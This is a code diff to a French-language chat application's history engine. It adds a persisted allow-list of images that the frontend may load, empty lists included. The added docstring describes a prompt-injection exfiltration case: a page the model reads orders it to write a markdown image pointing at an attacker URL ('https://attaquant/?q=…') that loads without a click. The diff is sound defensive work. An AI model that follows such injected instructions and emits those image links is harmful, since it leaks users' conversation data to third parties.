@@ -557,6 +557,17 @@ class HistoryEngine:
         pose. Même statut que ``sources`` et ``trace_recherche`` — de la
         PRÉSENTATION, jamais réinjectée dans le prompt : le modèle n'a que faire
         de la comptabilité de son propre contexte.
+
+        ── ``images_autorisees`` : restriction de rendu, liste VIDE comprise ──
+
+        Sur un tour qui a lu une URL, la réponse porte ``images_autorisees`` —
+        l'ensemble de référence des citations du tour. Le frontend ne charge
+        aucune image hors de cette liste (une page lue peut ordonner d'écrire
+        ``![](https://attaquant/?q=…)``, chargé sans clic). Persistée pour que
+        la restriction survive à un F5. **Une liste vide est conservée**, à la
+        différence de ``sources`` : vide veut dire « aucune image autorisée »,
+        absent veut dire « aucune restriction » — les confondre lèverait la
+        protection au rechargement.
         """
         try:
             with self._conversation_transaction(conv_id) as conv:
@@ -584,6 +595,9 @@ class HistoryEngine:
                     contexte_tokens = m.get("contexte_tokens")
                     if isinstance(contexte_tokens, int) and contexte_tokens > 0:
                         entree["contexte_tokens"] = contexte_tokens
+                    images_autorisees = m.get("images_autorisees")
+                    if isinstance(images_autorisees, list):
+                        entree["images_autorisees"] = [u for u in images_autorisees if isinstance(u, str)]
                     conv["messages"].append(entree)
                 if model:
                     conv["modèle"] = model
